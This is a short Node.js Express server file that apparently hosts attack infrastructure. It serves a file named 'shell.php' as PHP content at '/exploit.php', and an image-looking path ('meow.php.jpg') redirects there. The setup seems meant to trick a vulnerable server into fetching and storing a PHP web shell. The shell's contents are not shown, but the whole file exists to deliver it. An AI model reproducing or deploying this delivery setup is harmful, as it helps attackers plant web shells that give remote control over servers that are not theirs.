const express = require('express');
const app = express();

const PORT = 3000;

app.get('/exploit.php', (req,res) => {
  console.log(req.path);
 res.setHeader('content-type', 'application/x-httpd-php');
  res.sendFile(__dirname + '/public/shell.php');
})

app.get('/gay.php/meow.php.jpg', (req,res) => {
  console.log(req.path);
 // res.setHeader('content-type', 'application/x-httpd-php');
res.redirect('/exploit.php')
})

const server = app.listen(PORT, () => {
  console.log("server is running on port ", 3000);
});
